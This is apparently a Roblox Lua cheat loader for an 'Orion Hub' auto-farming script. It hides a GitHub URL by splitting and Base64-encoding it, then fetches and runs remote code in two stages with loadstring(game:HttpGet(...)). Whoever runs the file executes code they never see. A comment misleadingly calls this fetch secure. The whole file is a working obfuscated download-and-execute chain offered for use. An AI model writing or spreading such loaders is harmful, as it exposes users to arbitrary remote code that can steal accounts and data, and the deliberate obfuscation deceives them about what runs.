-- Breaking up the Base64 encoded URL into smaller parts
local encodedUrlPart1 = "aH" .. "R0Y"
local encodedUrlPart2 = "Y" .. "zo6Ly9yYXcuZ2l0aHViLmNvbS9NZWxoYXJwZXIvcmVmcy9oZWFkcy9tYWluL3VybF9kZWNvZGVyLmx1YQ=="

-- Combine the parts into one Base64 encoded URL
local encodedUrl = encodedUrlPart1 .. encodedUrlPart2

-- Base64 decoding function
local function decodeBase64(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^' .. b .. '=]', '')
    return (data:gsub('.', function(x)
        if x == '=' then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do
            r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0')
        end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if #x ~= 8 then return '' end
        local c = 0
        for i = 1, 8 do
            c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0)
        end
        return string.char(c)
    end))
end

-- Decode the URL from the Base64 string
local decodedUrl = decodeBase64(encodedUrl)

-- Fetch the URL decoder script securely
local urlDecoderScript = game:HttpGet(decodedUrl)
local urlDecoder = loadstring(urlDecoderScript)()  -- Execute the URL decoder script and return the object

-- Access the decoded URL and whitelist check function (already handled in url_decoder.lua)
local decodedUrl = urlDecoder.decodedUrl
local isWhitelisted = urlDecoder.isWhitelisted

-- Check if the decoded URL is valid and not empty
if decodedUrl and decodedUrl ~= "" then
    -- Load and execute the decoded URL (Orion Hub / Hub Auto Farming script)
    local success, errorMessage = pcall(function()
        loadstring(game:HttpGet(decodedUrl))()
    end)
    if not success then
        warn("Error loading script:", errorMessage) -- Error loading the script
    end
else
    warn("Decoded URL is invalid or empty!")
end
